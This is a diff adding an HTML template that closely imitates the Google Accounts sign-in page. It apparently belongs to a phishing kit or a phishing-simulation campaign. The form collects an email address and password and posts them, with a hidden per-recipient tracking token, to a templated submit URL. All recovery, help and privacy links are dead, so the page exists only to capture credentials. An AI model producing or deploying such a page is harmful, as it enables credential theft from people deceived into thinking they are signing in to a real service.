@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Google Accounts</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Google Sans","Roboto",Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.container{width:100%;max-width:450px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px;margin:20px}
+.logo-area{text-align:center;margin-bottom:16px}
+.logo-area svg{width:75px;height:24px}
+h1.title{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
+p.subtitle{font-size:16px;font-weight:400;color:#202124;text-align:center;margin-bottom:32px}
+.form-group{margin-bottom:24px;position:relative}
+.form-group label{position:absolute;top:50%;left:16px;transform:translateY(-50%);font-size:16px;color:#5f6368;pointer-events:none;transition:all 0.15s ease}
+.form-group input{width:100%;padding:13px 16px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;font-family:inherit;background:transparent}
+.form-group input:focus{border:2px solid #1a73e8;padding:12px 15px}
+.form-group input:focus+label,
+.form-group input:not(:placeholder-shown)+label{top:-8px;left:12px;font-size:12px;background:#fff;padding:0 4px;transform:none}
+.form-group input:focus+label{color:#1a73e8}
+.error-msg{color:#d93025;font-size:12px;margin-top:8px;display:none}
+a.link{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500}
+a.link:hover{background:rgba(26,115,232,0.04);border-radius:4px}
+.forgot-row{margin-bottom:32px}
+.button-row{display:flex;justify-content:space-between;align-items:center}
+.btn-next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:9px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;letter-spacing:0.25px}
+.btn-next:hover{background:#1765cc;box-shadow:0 1px 2px rgba(0,0,0,0.3)}
+.btn-next:focus{outline:2px solid #174ea6;outline-offset:2px}
+.step{display:none}
+.step.active{display:block}
+.email-chip{display:inline-flex;align-items:center;gap:6px;background:#e8f0fe;border-radius:16px;padding:2px 12px 2px 4px;font-size:14px;color:#3c4043;margin-bottom:16px;cursor:pointer}
+.email-chip svg{width:20px;height:20px}
+.footer{margin-top:32px;text-align:center;font-size:12px;color:#5f6368}
+.footer-links{display:flex;justify-content:space-between;margin-top:24px;font-size:12px}
+.footer-links select{border:none;font-size:12px;color:#5f6368;background:transparent;cursor:pointer}
+.footer-links a{color:#5f6368;text-decoration:none;margin-left:16px}
+.footer-links a:hover{text-decoration:underline}
+@media(max-width:480px){.container{border:none;padding:24px 24px;margin:0}}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo-area">
+<!-- Google "G" logo -->
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
+<path d="M12.24 10.285V14.4h6.806c-.275 1.765-2.056 5.174-6.806 5.174-4.095 0-7.439-3.389-7.439-7.574s3.345-7.574 7.439-7.574c2.33 0 3.891.989 4.785 1.849l3.254-3.138C18.189 1.186 15.479 0 12.24 0c-6.635 0-12 5.365-12 12s5.365 12 12 12c6.926 0 11.52-4.869 11.52-11.726 0-.788-.085-1.39-.189-1.989H12.24z" fill="#4285F4"/>
+<text x="30" y="19" font-family="'Product Sans','Roboto',Arial,sans-serif" font-size="20" font-weight="500">
+<tspan fill="#4285F4">o</tspan><tspan fill="#EA4335">o</tspan><tspan fill="#FBBC05">g</tspan><tspan fill="#4285F4">l</tspan><tspan fill="#34A853">e</tspan>
+</text>
+</svg>
+</div>
+
+<form id="loginForm" method="POST" action="{{ submit_url }}">
+<input type="hidden" name="recipient_token" value="{{ recipient_token }}">
+
+<!-- Step 1: Email -->
+<div class="step active" id="step-email">
+<h1 class="title">Sign in</h1>
+<p class="subtitle">Use your Google Account</p>
+<div class="form-group">
+<input type="email" id="emailInput" name="email" placeholder=" " autocomplete="username" required>
+<label for="emailInput">Email or phone</label>
+<div class="error-msg" id="emailError">Enter an email or phone number.</div>
+</div>
+<div class="forgot-row">
+<a href="#" class="link" onclick="return false;">Forgot email?</a>
+</div>
+<p style="font-size:14px;color:#5f6368;margin-bottom:32px;line-height:1.5">
+Not your computer? Use a private browsing window to sign in.
+<a href="#" class="link" onclick="return false;">Learn more about using Guest mode</a>
+</p>
+<div class="button-row">
+<a href="#" class="link" onclick="return false;">Create account</a>
+<button type="button" class="btn-next" id="btnNext" onclick="showPasswordStep()">Next</button>
+</div>
+</div>
+
+<!-- Step 2: Password -->
+<div class="step" id="step-password">
+<h1 class="title">Welcome</h1>
+<div style="text-align:center;margin-bottom:16px">
+<span class="email-chip" onclick="showEmailStep()">
+<svg viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+<circle cx="10" cy="10" r="10" fill="#5f6368"/>
+<text x="10" y="14" text-anchor="middle" fill="#fff" font-size="11" font-family="Arial">?</text>
+</svg>
+<span id="displayEmail"></span>
+<svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="width:12px;height:12px">
+<path d="M6 8l4 4 4-4" stroke="#5f6368" stroke-width="1.5" fill="none"/>
+</svg>
+</span>
+</div>
+<div class="form-group">
+<input type="password" id="passwordInput" name="password" placeholder=" " autocomplete="current-password" required>
+<label for="passwordInput">Enter your password</label>
+<div class="error-msg" id="passwordError">Wrong password. Try again.</div>
+</div>
+<div class="forgot-row">
+<a href="#" class="link" onclick="return false;">Forgot password?</a>
+</div>
+<div class="button-row">
+<span></span>
+<button type="submit" class="btn-next">Next</button>
+</div>
+</div>
+</form>
+</div>
+
+<div class="footer-links" style="width:100%;max-width:450px;padding:0 40px;margin-top:16px">
+<select aria-label="Language">
+<option>English (United States)</option>
+</select>
+<div>
+<a href="#" onclick="return false;">Help</a>
+<a href="#" onclick="return false;">Privacy</a>
+<a href="#" onclick="return false;">Terms</a>
+</div>
+</div>
+
+<script>
+function showPasswordStep(){
+var email=document.getElementById("emailInput");
+if(!email.value||email.value.indexOf("@")<1){
+document.getElementById("emailError").style.display="block";
+return;
+}
+document.getElementById("emailError").style.display="none";
+document.getElementById("displayEmail").textContent=email.value;
+document.getElementById("step-email").classList.remove("active");
+document.getElementById("step-password").classList.add("active");
+document.getElementById("passwordInput").focus();
+}
+function showEmailStep(){
+document.getElementById("step-password").classList.remove("active");
+document.getElementById("step-email").classList.add("active");
+document.getElementById("emailInput").focus();
+}
+document.getElementById("emailInput").addEventListener("keydown",function(e){
+if(e.key==="Enter"){e.preventDefault();showPasswordStep();}
+});
+</script>
+</body>
+</html>
